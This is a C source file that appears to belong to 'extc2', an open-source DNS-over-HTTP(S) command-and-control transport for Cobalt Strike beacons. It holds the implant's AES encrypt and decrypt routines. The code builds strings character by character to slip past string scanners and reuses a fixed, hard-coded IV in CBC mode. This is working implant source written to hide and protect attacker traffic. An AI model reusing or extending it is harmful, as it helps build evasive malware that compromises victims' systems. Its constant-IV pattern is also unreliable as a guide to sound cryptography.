/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "../common.h"

/*-
 *
 * CryptAesInit
 *
 * Purpose:
 *
 * Creates the key object for AES
 *
-*/
DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins )
{
	UCHAR Str[ MAX_PATH ];

	Str[0]  = 'M';
	Str[1]  = 'i';
	Str[2]  = 'c';
	Str[3]  = 'r';
	Str[4]  = 'o';
	Str[5]  = 's';
	Str[6]  = 'o';
	Str[7]  = 'f';
	Str[8]  = 't';
	Str[9]  = ' ';
	Str[10] = 'E';
	Str[11] = 'n';
	Str[12] = 'h';
	Str[13] = 'a';
	Str[14] = 'n';
	Str[15] = 'c';
	Str[16] = 'e';
	Str[17] = 'd';
	Str[18] = ' ';
	Str[19] = 'R';
	Str[20] = 'S';
	Str[21] = 'A';
	Str[22] = ' ';
	Str[23] = 'a';
	Str[24] = 'n';
	Str[25] = 'd';
	Str[26] = ' ';
	Str[27] = 'A';
	Str[28] = 'E';
	Str[29] = 'S';
	Str[30] = ' ';
	Str[31] = 'C';
	Str[32] = 'r';
	Str[33] = 'y';
	Str[34] = 'p';
	Str[35] = 't';
	Str[36] = 'o';
	Str[37] = 'g';
	Str[38] = 'r';
	Str[39] = 'a';
	Str[40] = 'p';
	Str[41] = 'h';
	Str[42] = 'i';
	Str[43] = 'c';
	Str[44] = ' ';
	Str[45] = 'P';
	Str[46] = 'r';
	Str[47] = 'o';
	Str[48] = 'v';
	Str[49] = 'i';
	Str[50] = 'd';
	Str[51] = 'e';
	Str[52] = 'r';
	Str[53] = 0x0;

	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, Str, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportKey( Ins->key[1].Provider, Ins->key[1].Ptr, Ins->key[1].Len, 0, 0, &Ins->key[1].Key ) )
		{
			return TRUE;
		};
		Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptAesFree
 *
 * Purpose:
 *
 * Free's the associated keys for AES
 *
-*/
DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[1].Key );
	Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
};

/*-
 *
 * CryptAesDecrypt
 *
 * Purpose:
 *
 * Decrypts the buffer using AES-128
 * CBC.
 *
-*/
DEFINESEC(B) BOOL CryptAesDecrypt( PBEACON_INSTANCE Ins, PVOID InOut, ULONG InOutLen )
{
	DWORD EncMod = CRYPT_MODE_CBC;
	UCHAR StrIvs[16];

        StrIvs[0]  = 'a';
        StrIvs[1]  = 'b';
        StrIvs[2]  = 'c';
        StrIvs[3]  = 'd';
        StrIvs[4]  = 'e';
        StrIvs[5]  = 'f';
        StrIvs[6]  = 'g';
        StrIvs[7]  = 'h';
        StrIvs[8]  = 'i';
        StrIvs[9]  = 'j';
        StrIvs[10] = 'k';
        StrIvs[11] = 'l';
        StrIvs[12] = 'm';
        StrIvs[13] = 'n';
        StrIvs[14] = 'o';
        StrIvs[15] = 'p';

	if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_IV, StrIvs, 0 ) )
	{
		if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_MODE, CPTR( &EncMod ), 0 ) )
		{
			return Ins->api.CryptDecrypt(
				Ins->key[1].Key,
				0,
				FALSE,
				CRYPT_DECRYPT_RSA_NO_PADDING_CHECK,
				InOut,
				&InOutLen
				);
		};
	};
	RtlSecureZeroMemory( StrIvs, 16 );
};

/*-
 *
 * CryptAesEncrypt
 *
 * Purpose:
 *
 * Encrypts the buffer using AES-128
 * CBC.
 *
 * Must be padded to a multiple of 
 * 16.
 *
-*/
DEFINESEC(B) BOOL CryptAesEncrypt( PBEACON_INSTANCE Ins, PVOID In, ULONG InLen, PVOID* Out, ULONG* OutLen )
{
	DWORD EncMod = CRYPT_MODE_CBC;
	DWORD EncLen = InLen;
	DWORD TxtLen = InLen;
	UCHAR StrIvs[16];

	StrIvs[0]  = 'a';
	StrIvs[1]  = 'b';
	StrIvs[2]  = 'c';
	StrIvs[3]  = 'd';
	StrIvs[4]  = 'e';
	StrIvs[5]  = 'f';
	StrIvs[6]  = 'g';
	StrIvs[7]  = 'h';
	StrIvs[8]  = 'i';
	StrIvs[9]  = 'j';
	StrIvs[10] = 'k';
	StrIvs[11] = 'l';
	StrIvs[12] = 'm';
	StrIvs[13] = 'n';
	StrIvs[14] = 'o';
	StrIvs[15] = 'p';

	if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_IV, StrIvs, 0 ) )
	{
		if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_MODE, CPTR( &EncMod ), 0 ) )
		{

			if ( Ins->api.CryptEncrypt(
					Ins->key[1].Key,
					0,
					TRUE,
					0,
					NULL,
					&EncLen,
					TxtLen
					))
			{
				if ((*Out = Ins->api.LocalAlloc( LPTR, EncLen )))
				{
					memset( *Out,'A', EncLen );
					memcpy( *Out, In, TxtLen );

					if ( Ins->api.CryptEncrypt(
							Ins->key[1].Key,
							0,
							TRUE,
							0,
							*Out,
							&TxtLen,
							EncLen
							))
					{
						*OutLen = TxtLen; return TRUE;
					};	
					Ins->api.LocalFree( *Out );
				};
			};
		};
	};
	RtlSecureZeroMemory( StrIvs, 16 ); *Out = NULL; *OutLen = 0; return FALSE;
};
